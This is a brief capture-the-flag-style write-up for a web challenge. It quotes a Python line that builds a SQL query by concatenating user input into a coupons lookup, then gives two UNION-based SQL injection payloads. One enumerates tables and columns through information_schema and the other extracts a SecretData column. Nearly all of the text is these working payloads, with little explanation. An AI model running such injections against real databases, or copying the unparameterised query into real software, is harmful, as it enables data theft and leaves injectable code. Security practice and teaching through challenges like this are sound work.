You can see python code by accessing /?source=1  

Vulnerable piece of code:  

mycursor.execute("SELECT * FROM coupons WHERE code = '" + opcode + "'")  
SQL:  
' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND ''='  
SQL:  
' UNION SELECT 1,SecretData,2 FROM 64ff585930293b81079991770a3b28de WHERE ''='

